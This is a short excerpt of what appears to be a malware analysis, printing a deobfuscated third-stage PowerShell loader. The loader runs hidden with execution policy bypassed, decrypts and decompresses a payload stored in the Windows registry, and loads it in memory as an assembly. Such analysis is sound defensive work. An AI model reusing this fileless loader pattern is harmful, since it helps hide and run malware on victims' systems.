...
### Deobfuscated script stage 3 (read from registry key)

```ps
"C:\Windows\$sxr-powershell.exe" -NoLogo -NoProfile -Noninteractive -WindowStyle hidden -ExecutionPolicy bypass -Command 

[System.Diagnostics.Process]::GetProcessById(4856).WaitForExit();
...
function DecompressGzip($ciphertext){	$memstream3=New-Object System.IO.MemoryStream(,$ciphertext);
	$memstream=New-Object System.IO.MemoryStream;
	$memstream2=New-Object System.IO.Compression.GZipStream($memstream3, [IO.Compression.CompressionMode]::Decompress);
...
$Decryptor2.Dispose();
$AESObject1.Dispose();
$OpenRegKey = [Microsoft.Win32.Registry]::$Decrypted8.$Decrypted7($Decrypted).$Decrypted6($Decrypted2);
$OpenRegKey=[string[]]$OpenRegKey.Split('\');
$Decompression=DecompressGzip(Decrypt([System.Convert]::FromBase64String($OpenRegKey[1])));
LoadPE $Decompression (,[string[]] ('%*'));
...
$Decryptor.Dispose();
$AESObject.Dispose();
$memstream3 = New-Object System.IO.MemoryStream(, $DecryptRegKey);
$memstream = New-Object System.IO.MemoryStream;
$memstream2 = New-Object System.IO.Compression.GZipStream($memstream3, [IO.Compression.CompressionMode]::$Decrypted1);
$memstream2.$Decrypted9($memstream);
$memstream2.Dispose();
$memstream3.Dispose();
$memstream.Dispose();
$DecryptRegKey = $memstream.ToArray();
$LoadAssembly = [System.Reflection.Assembly]::Load($DecryptRegKey);
$AssemblyEntryPoint = $LoadAssembly.EntryPoint;
$AssemblyEntryPoint.$Decrypted0($null, (, [string[]] ($Decrypted3)))
```
